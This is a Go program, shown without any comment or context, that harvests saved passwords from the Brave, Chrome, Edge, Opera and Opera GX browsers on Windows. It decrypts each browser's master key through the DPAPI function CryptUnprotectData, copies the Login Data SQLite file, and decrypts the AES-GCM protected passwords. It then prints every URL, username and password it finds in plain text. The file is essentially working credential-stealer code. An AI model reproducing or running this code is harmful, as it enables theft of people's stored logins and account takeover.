package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

var (
	APPDATA = os.Getenv("APPDATA")
	LOCAL   = os.Getenv("LOCALAPPDATA")

	USER_PATHS = [5]string{
		filepath.Join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(),
		filepath.Join(LOCAL, "Microsoft", "Edge", "User Data"),
		filepath.Join(APPDATA, "Opera Software", "Opera Stable"),
		filepath.Join(APPDATA, "Opera Software", "Opera GX Stable"),
	}

	LOCAL_PATHS = [5]string{
		filepath.Join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
		filepath.Join(LOCAL, "Google", "Chrome", "User Data", "Local State"),
		filepath.Join(LOCAL, "Microsoft", "Edge", "User Data", "Local State"),
		filepath.Join(APPDATA, "Opera Software", "Opera Stable", "Local State"),
		filepath.Join(APPDATA, "Opera Software", "Opera GX Stable", "Local State"),
	}

	LOGIN_PATHS = [5]string{
		filepath.Join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
		filepath.Join(LOCAL, "Google", "Chrome", "User Data", "Default", "Login Data"),
		filepath.Join(LOCAL, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
		filepath.Join(APPDATA, "Opera Software", "Opera Stable", "Default", "Login Data"),
		filepath.Join(APPDATA, "Opera Software", "Opera GX Stable", "Login Data"),
	}

	BROWSERS = [6]string{"Brave", "Chrome", "Edge", "Opera", "Opera GX", "Discord"}
	KEYS     [][]byte
)

func decrypt(value, key []byte) string {
	aesBlock, _ := aes.NewCipher(key)
	gcmBlock, _ := cipher.NewGCM(aesBlock)

	nonce := value[:gcmBlock.NonceSize()]
	value = value[gcmBlock.NonceSize():]

	plaintext, _ := gcmBlock.Open(nil, nonce, value, nil)
	return string(plaintext)
}

func queryDB(path, query string) *sql.Rows {
	database, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	os.WriteFile("vault.db", database, 0644)

	db, err := sql.Open("sqlite3", "vault.db")
	if err != nil {
		return nil
	}
	defer db.Close()

	rows, err := db.Query(query)
	if err != nil {
		return nil
	}

	return rows
}

type DataBlob struct {
	Size uint32
	Data *byte
}

func CryptUnprotectData(data []byte) []byte {
	var inBlob = DataBlob{Size: uint32(len(data)), Data: &data[0]}
	var outBlob DataBlob

	crypt32 := syscall.NewLazyDLL("Crypt32.dll")
	CryptUnprotectedData := crypt32.NewProc("CryptUnprotectData")

	CryptUnprotectedData.Call(uintptr(unsafe.Pointer(&inBlob)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))

	return unsafe.Slice(outBlob.Data, outBlob.Size)
}

func getKey(path string) []byte {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	var dump map[string]interface{}
	json.Unmarshal(data, &dump)

	encodedKey := dump["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	encryptedKey, _ := base64.StdEncoding.DecodeString(encodedKey)

	return CryptUnprotectData(encryptedKey[5:])
}

func enumKeys() {
	for _, path := range LOCAL_PATHS {
		KEYS = append(KEYS, getKey(path))
	}
}

func main() {
	defer func() {
		os.Remove("vault.db")

	}()

	enumKeys()
	for index, path := range LOGIN_PATHS {

		rows := queryDB(path, "SELECT origin_url, username_value, password_value FROM logins;")
		if rows == nil {
			continue
		}

		for rows.Next() {
			var url, username, password string
			rows.Scan(&url, &username, &password)

			if strings.HasPrefix(password, "v10") && len(KEYS[index]) > 0 {
				password := decrypt([]byte(password[3:]), KEYS[index])

				if strings.TrimSpace(password) != "" {
					fmt.Println(fmt.Sprintf("==================================================\nBrowser: %v\nURL: %v\nUsername: %v\nPassword: %v\n", BROWSERS[index], url, username, password))
				}
			}
		}
	}
}
